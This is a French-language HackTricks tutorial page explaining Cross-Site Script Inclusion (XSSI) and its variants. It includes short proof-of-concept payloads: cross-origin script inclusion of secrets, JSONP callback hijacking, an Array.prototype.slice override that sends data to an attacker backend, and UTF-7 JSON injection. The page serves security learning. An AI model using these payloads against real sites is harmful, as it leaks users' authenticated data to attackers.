# XSSI (Cross-Site Script Inclusion)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## Basic Information

**Cross-Site Script Inclusion (XSSI)** est une vuln√©rabilit√© qui d√©coule de la nature de la balise `script` en HTML. Contrairement √† la plupart des ressources, qui sont soumises √† la **Same-Origin Policy (SOP)**, les scripts peuvent √™tre inclus depuis diff√©rents domaines. Ce comportement est destin√© √† faciliter l'utilisation de biblioth√®ques et d'autres ressources h√©berg√©es sur diff√©rents serveurs, mais introduit √©galement un risque potentiel pour la s√©curit√©.

### Key Characteristics of **XSSI**:
- **Bypass of SOP**: Les scripts sont exempt√©s de la **Same-Origin Policy**, leur permettant d'√™tre inclus √† travers des domaines.
- **Data Exposure**: Un attaquant peut exploiter ce comportement pour lire des donn√©es charg√©es via la balise `script`.
- **Impact on Dynamic JavaScript/JSONP**: **XSSI** est particuli√®rement pertinent pour le JavaScript dynamique ou **JSON with Padding (JSONP)**. Ces technologies utilisent souvent des informations "d'autorit√© ambiante" (comme les cookies) pour l'authentification. Lorsqu'une requ√™te de script est faite vers un h√¥te diff√©rent, ces informations d'identification (par exemple, les cookies) sont automatiquement incluses dans la requ√™te.
- **Authentication Token Leakage**: Si un attaquant peut tromper le navigateur d'un utilisateur pour qu'il demande un script depuis un serveur qu'il contr√¥le, il pourrait √™tre en mesure d'acc√©der √† des informations sensibles contenues dans ces requ√™tes.

### Types

1. **Static JavaScript** - Cela repr√©sente la forme conventionnelle de XSSI.
2. **Static JavaScript with Authentication** - Ce type est distinct car il n√©cessite une authentification pour y acc√©der.
3. **Dynamic JavaScript** - Implique du JavaScript qui g√©n√®re dynamiquement du contenu.
4. **Non-JavaScript** - Fait r√©f√©rence aux vuln√©rabilit√©s qui n'impliquent pas directement JavaScript.

**The following information is a sumary of [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)**. Check it for further details.


### Regular XSSI
Dans cette approche, des informations priv√©es sont int√©gr√©es dans un fichier JavaScript accessible globalement. Les attaquants peuvent identifier ces fichiers en utilisant des m√©thodes telles que la lecture de fichiers, des recherches par mots-cl√©s ou des expressions r√©guli√®res. Une fois localis√©, le script contenant des informations priv√©es peut √™tre inclus dans un contenu malveillant, permettant un acc√®s non autoris√© √† des donn√©es sensibles. Une technique d'exploitation d'exemple est montr√©e ci-dessous :
```html
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script> alert(JSON.stringify(confidential_keys[0])); </script>
```
### Dynamic-JavaScript-based-XSSI et Authenticated-JavaScript-XSSI
Ces types d'attaques XSSI impliquent que des informations confidentielles soient ajout√©es dynamiquement au script en r√©ponse √† une demande de l'utilisateur. La d√©tection peut √™tre effectu√©e en envoyant des requ√™tes avec et sans cookies et en comparant les r√©ponses. Si les informations diff√®rent, cela peut indiquer la pr√©sence d'informations confidentielles. Ce processus peut √™tre automatis√© √† l'aide d'outils comme l'extension Burp [DetectDynamicJS](https://github.com/luh2/DetectDynamicJS).

Si des donn√©es confidentielles sont stock√©es dans une variable globale, elles peuvent √™tre exploit√©es en utilisant des m√©thodes similaires √† celles utilis√©es dans le XSSI r√©gulier. Cependant, si les donn√©es confidentielles sont incluses dans une r√©ponse JSONP, les attaquants peuvent d√©tourner la fonction de rappel pour r√©cup√©rer les informations. Cela peut √™tre fait en manipulant des objets globaux ou en configurant une fonction √† ex√©cuter par la r√©ponse JSONP, comme d√©montr√© ci-dessous :
```html
<script>
var angular = function () { return 1; };
angular.callbacks = function () { return 1; };
angular.callbacks._7 = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"></script>
```

```html
<script>
leak = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```
Pour les variables ne r√©sidant pas dans l'espace de noms global, *prototype tampering* peut parfois √™tre exploit√©. Cette technique tire parti de la conception de JavaScript, o√π l'interpr√©tation du code implique de parcourir la cha√Æne de prototypes pour localiser la propri√©t√© appel√©e. En rempla√ßant certaines fonctions, comme `Array`'s `slice`, les attaquants peuvent acc√©der et leak des variables non globales :
```javascript
Array.prototype.slice = function(){
// leaks ["secret1", "secret2", "secret3"]
sendToAttackerBackend(this);
};
```
Des d√©tails suppl√©mentaires sur les vecteurs d'attaque peuvent √™tre trouv√©s dans le travail du chercheur en s√©curit√© [Sebastian Lekies](https://twitter.com/slekies), qui maintient une liste de [vecteurs](http://sebastian-lekies.de/leak/).

### Non-Script-XSSI
La recherche de Takeshi Terada introduit une autre forme de XSSI, o√π des fichiers Non-Script, tels que CSV, sont divulgu√©s entre origines en √©tant inclus comme sources dans une balise `script`. Des exemples historiques de XSSI, tels que l'attaque de Jeremiah Grossman en 2006 pour lire un carnet d'adresses Google complet et la fuite de donn√©es JSON de Joe Walker en 2007, soulignent la gravit√© de ces menaces. De plus, Gareth Heyes d√©crit une variante d'attaque impliquant du JSON encod√© en UTF-7 pour √©chapper au format JSON et ex√©cuter des scripts, efficace dans certains navigateurs :
```javascript
[{'friend':'luke','email':'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'}]
```

```html
<script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"></script>
```
{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team GCP (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
